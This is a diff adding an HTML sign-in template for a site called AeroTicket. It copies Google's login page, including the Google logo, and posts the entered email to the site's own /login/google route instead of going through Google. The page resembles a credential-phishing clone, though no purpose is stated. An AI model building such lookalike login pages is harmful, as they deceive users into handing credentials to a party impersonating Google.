@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AeroTicket - Sign In</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="{{ url_for('static', filename='google.css') }}">
+
+</head>
+<body>
+
+<div class="container">
+    <div class="left-panel">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="48" alt="Google">
+        </div>
+        <h1>Sign in</h1>
+        <p class="subtext">Use your AeroTicket Account</p>
+    </div>
+
+    <div class="right-panel">
+       <form action="/login/google" method="POST">
+    <input type="hidden" name="step" value="email">
+    
+    <div class="input-group">
+        <input type="email" name="email" placeholder="Email or phone" required autofocus>
+        <a href="#" class="forgot-link">Forgot email?</a>
+    </div>
+
+    <p class="guest-mode-info">
+        Not your computer? Use Guest mode to sign in privately. <br>
+        <a href="#">Learn more about using Guest mode</a>
+    </p>
+
+    <div class="button-row">
+        <a href="{{ url_for('signup') }}" class="create-btn">Create account</a>
+        <button type="submit" class="next-btn">Next</button>
+    </div>
+</form>
+    </div>
+</div>
+
+<div class="page-footer">
+    <div>English (United States) ▼</div>
+    <div class="footer-links">
+        <span>Help</span>
+        <span>Privacy</span>
+        <span>Terms</span>
+    </div>
+</div>
+
+</body>
+</html>
